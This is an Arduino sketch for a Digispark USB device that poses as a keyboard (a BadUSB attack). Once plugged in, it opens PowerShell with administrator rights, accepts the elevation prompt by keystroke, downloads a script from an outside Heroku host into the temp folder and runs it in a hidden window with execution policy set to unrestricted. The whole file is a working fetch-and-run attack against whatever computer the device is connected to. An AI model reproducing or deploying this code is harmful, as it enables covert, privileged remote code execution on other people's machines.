#include "DigiKeyboardDe.h"

void setup() {
  DigiKeyboard.delay(2500); //wait 2500 milliseconds before first run, to give target time to initialize
  
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboardDe.sendKeyStroke(KEY_R,MOD_GUI_LEFT); // meta+r
  delay(1000);
  DigiKeyboardDe.println(F("powershell start-process powershell -verb runas"));
  delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); 
  delay(1000);
  DigiKeyboardDe.println(F("Invoke-RestMethod -Method Get -Uri https://gabup.herokuapp.com/script/main -OutFile $env:temp\\main.ps1; "));
  delay(1000);
  DigiKeyboardDe.println(F("powershell.exe -windowstyle hidden -executionpolicy unrestricted -file $env:temp\\main.ps1; "));
}

void loop() {

}
